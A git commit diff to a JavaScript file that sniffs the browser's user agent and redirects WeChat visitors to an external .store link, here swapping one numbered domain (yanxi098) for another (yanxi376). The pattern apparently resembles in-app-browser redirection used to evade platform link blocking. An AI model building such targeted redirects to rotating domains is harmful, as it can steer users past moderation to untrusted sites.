cb46522836163dfd6bee6aebdb737bb04f72a325
wrong520 <153003606+wrong520@users.noreply.github.com>
2024-05-20 21:48:33 +0800

    更新 62.js

--- js/62.js
+++ js/62.js
@@ -2,7 +2,7 @@ let is_weixin_qq = (function() {
     let ua = navigator.userAgent.toLowerCase();
     if (ua.match(/MicroMessenger/i) == 'micromessenger') {
         //如果是微信则打开此链接   ！！按照书写标准写入到"内！！
-        window.location.href = "http://www.yanxi098.store/ewmdy/"
+        window.location.href = "http://www.yanxi376.store/ewmdy/"
     }else
     if (ua.match(/QQ/i) == 'qq') {
         //如果是QQ则打开此链接   ！！按照书写标准写入到"内！！
